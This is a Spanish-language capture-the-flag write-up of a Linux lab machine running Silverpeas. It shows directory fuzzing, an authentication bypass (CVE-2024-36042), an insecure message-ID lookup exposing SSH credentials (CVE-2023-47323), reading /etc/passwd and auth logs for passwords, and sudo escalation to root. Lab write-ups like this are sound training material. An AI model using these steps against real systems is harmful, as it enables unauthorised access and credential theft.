# Silver Platter

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux explotando varias vulnerabilidades presentes en **Silverpeas**, obteniendo acceso inicial mediante un **Authentication Bypass**, recuperando credenciales SSH a través de una vulnerabilidad de lectura arbitraria de mensajes y escalando privilegios hasta **root** mediante una configuración insegura de **sudo**.

---

## 🛠️ Tecnologías trabajadas

- AutoNmap
- Incursore
- FFUF
- Burp Suite
- Silverpeas
- CVE-2024-36042
- CVE-2023-47323
- SSH
- Enumeración de logs
- Sudo

---

## 🧠 Metodología

La enumeración inicial reveló una superficie de ataque reducida formada por **SSH** y dos servicios web. El reconocimiento permitió identificar la aplicación **Silverpeas**, lo que orientó la investigación hacia la búsqueda de vulnerabilidades conocidas para dicho software.

Tras localizar una vulnerabilidad de **Authentication Bypass**, conseguí acceder al panel de administración sin disponer de credenciales válidas. Una vez autenticado, identifiqué una segunda vulnerabilidad que permitía leer mensajes internos de otros usuarios, recuperando así unas credenciales SSH válidas.

Con acceso al sistema mediante **SSH**, la enumeración local permitió descubrir credenciales almacenadas en los archivos de log del sistema. Dichas credenciales pertenecían a otro usuario con permisos completos sobre **sudo**, lo que permitió obtener una shell como **root**.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un reconocimiento con **AutoNmap** e **Incursore**.

Los servicios detectados fueron:

| Puerto | Servicio |
|---------|----------|
| 22 | SSH |
| 80 | HTTP |
| 8080 | HTTP (Proxy) |

Durante la revisión del laboratorio se indicaba que las contraseñas habían sido verificadas utilizando el diccionario **rockyou.txt**, por lo que era poco probable encontrar credenciales débiles mediante ataques de fuerza bruta.

---

### 2. Enumeración web

Realicé un fuzzing sobre el servicio HTTP del puerto 80.

```bash
ffuf -u http://10.129.161.96/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.bak,.txt,.html -t 40 -mc 200,301,302
```

Durante el análisis de la página principal identifiqué la siguiente información:

Usuario:

```text
scr1ptkiddy
```

Nombre del proyecto:

```text
Silverpeas
```

El fuzzing descubrió los siguientes recursos:

- `/assets`
- `/images`
- `/index.html`
- `/LICENSE.txt`
- `/README.txt`

Ninguno de ellos proporcionó información útil para continuar con la explotación.

---

### 3. Descubrimiento del panel de administración

Repetí el proceso de enumeración sobre el puerto **8080**.

Entre los recursos descubiertos aparecieron:

- `/website`
- `/console`

Aunque inicialmente no resultaban interesantes, utilicé el nombre de la aplicación descubierto anteriormente.

```text
http://10.129.161.96:8080/silverpeas
```

Accedí a un panel de autenticación perteneciente a:

```text
Silverpeas
```

---

### 4. Identificación de vulnerabilidades

La versión instalada correspondía aproximadamente a una edición mantenida hasta **2022**, por lo que busqué vulnerabilidades publicadas posteriormente.

```bash
searchsploit Silverpeas
```

Encontré una vulnerabilidad de bypass de autenticación.

```text
CVE-2024-36042
```

---

### 5. Acceso inicial

Intercepté la petición de autenticación utilizando **Burp Suite**.

Eliminando el parámetro correspondiente a la contraseña y reenviando la solicitud fue posible acceder al panel de administración sin disponer de credenciales válidas.

Con ello obtuve acceso inicial a la aplicación.

---

### 6. Obtención de credenciales SSH

Una vez autenticado continué buscando vulnerabilidades adicionales de Silverpeas.

Encontré la siguiente:

```text
CVE-2023-47323
```

Esta vulnerabilidad permitía acceder de forma arbitraria a mensajes internos.

Utilicé la siguiente URL:

```text
http://localhost:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=[messageID]
```

Modificando el parámetro `ID` localicé un mensaje especialmente interesante.

```text
ID = 6
```

El contenido revelaba las siguientes credenciales SSH.

```text
Usuario: tim

Contraseña:
cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```

---

### 7. Acceso mediante SSH

Utilicé las credenciales obtenidas para acceder al sistema.

```bash
ssh tim@10.129.161.96
```

Una vez autenticado recuperé la flag de usuario.

```bash
cat user.txt
```

---

### 8. Enumeración local

Comencé enumerando los usuarios del sistema.

```bash
cat /etc/passwd
```

Entre ellos identifiqué al usuario:

```text
tyler
```

Posteriormente revisé los archivos de log relacionados con la autenticación.

```bash
cat /var/log/auth* | grep -a -i pass
```

Durante la revisión encontré una contraseña almacenada en texto claro.

```text
_Zd_zx7N823/
```

---

### 9. Movimiento lateral

Probé la contraseña obtenida para cambiar al usuario **tyler**.

```bash
su tyler
```

La autenticación fue correcta, permitiéndome acceder con este nuevo usuario.

---

### 10. Escalada de privilegios

Comprobé los permisos disponibles mediante `sudo`.

```bash
sudo -l
```

El resultado indicaba que el usuario podía ejecutar cualquier comando como **root**.

Simplemente ejecuté:

```bash
sudo su
```

Obteniendo una shell con privilegios de:

```text
root
```

---

### 11. Obtención de la flag final

Accedí al directorio del administrador.

```bash
cd /root
```

Leí el archivo:

```bash
cat root.txt
```

---

## 📚 Lecciones aprendidas

- Este laboratorio mostró una cadena de explotación basada principalmente en el aprovechamiento de vulnerabilidades públicas de una aplicación web, seguida de una correcta enumeración local para completar la escalada de privilegios.
- Identificar instalaciones vulnerables de **Silverpeas**.
- Realizar fuzzing de directorios utilizando **FFUF**.
- Explotar un **Authentication Bypass** (CVE-2024-36042).
- Aprovechar una vulnerabilidad de lectura arbitraria de mensajes (CVE-2023-47323).
- Recuperar credenciales SSH desde información interna de la aplicación.
- Enumerar usuarios y revisar archivos de log del sistema.
- Identificar credenciales almacenadas en registros de autenticación.
- Realizar movimiento lateral mediante `su`.
- Enumerar permisos de **sudo** para identificar configuraciones inseguras.
- Obtener privilegios de **root** mediante permisos completos sobre `sudo`.
